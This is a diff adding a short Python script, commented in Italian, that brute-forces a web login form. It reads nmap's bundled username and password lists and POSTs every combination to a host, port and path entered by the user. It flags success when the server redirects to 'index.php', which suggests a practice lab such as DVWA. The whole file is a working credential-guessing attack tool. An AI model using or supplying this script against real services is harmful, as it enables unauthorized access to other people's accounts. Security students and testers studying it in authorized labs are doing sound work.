@@ -1,0 +1,38 @@
+#programma per il brute force
+#import dei moduli
+import http.client, urllib.parse
+#di seguito codice per inserimento manuale del target
+host = str(input("inserisci l'host bersaglio:\n"))
+port = int(input("inserisci la porta bersaglio:\n"))
+path = input("inserisci la destinazione bersaglio:\n")
+#inserimento delle path interne al pc per l'utilizzo delle liste di nomi utente e password
+user_list = open('/usr/share/nmap/nselib/data/usernames.lst')
+pwd_list = open('/usr/share/nmap/nselib/data/passwords.lst')
+#con il comando readlines() permettiamo al programma di leggere le righe come elementi interni alla lista
+user_list = user_list.readlines()
+pwd_list = pwd_list.readlines()
+#primo ciclo di lettura degli username
+for user in user_list:
+	user = user.rstrip()
+	#comando di controllo per verificare la corretta lettura dei nomi(lasciato come commento)
+	#print(user)
+	#ciclo for annidato per inserire ogni password ai relativi username
+	for pwd in pwd_list:
+		pwd = pwd.rstrip()
+		#commando di verifica per l'avvenuta associazione tra username e password(lasciato come commento)
+		#print (user,"-",pwd)
+	
+
+		#inserimento dei parametri per entrare nel server
+		post_parameters = urllib.parse.urlencode({'username':user, 'password':pwd,'Login':"login"})
+		headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml"}
+		#attivazione della connessione con inserimento manuale del ip e della porta
+		conn = http.client.HTTPConnection(host,port)
+		#inserimento delle richieste nella connessione
+		conn.request("POST",path, post_parameters,headers)
+		#ricezione della risposta
+		response = conn.getresponse()
+		#metodo di controllo dell'avvenuto bruteforce
+		if(response.getheader('location')=="index.php"):
+			#se la path di destinazione è quella corretta scrive username e password con cui è entrato
+			print("logged with:\n",user,"-",pwd)
